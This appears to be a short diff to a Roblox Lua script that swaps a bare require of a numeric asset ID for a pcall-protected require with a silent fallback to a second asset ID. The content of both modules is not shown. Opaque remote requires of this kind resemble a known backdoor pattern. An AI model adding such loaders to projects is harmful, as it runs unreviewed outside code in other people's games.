@@ -1,1 +1,4 @@
-require(138494475167841)
+local s, r = pcall(function () return require(138494475167841) end)
+if not s then
+  require(94397082108066)
+end
